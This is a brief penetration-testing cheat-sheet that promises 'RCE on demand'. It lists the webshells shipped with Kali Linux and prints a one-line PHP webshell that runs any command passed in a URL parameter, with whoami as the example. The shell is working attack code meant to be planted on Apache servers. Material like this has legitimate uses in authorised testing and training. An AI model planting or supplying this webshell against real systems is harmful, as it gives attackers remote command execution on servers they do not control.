## Intro
Who doesn't like the RCE on demand?

List webshells available on Kali
```
tree /usr/share/webshells/
```

## Apache
Basic PHP webshell
```
# Take input from the URL paramter. e.g http://<IP>/shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>
```
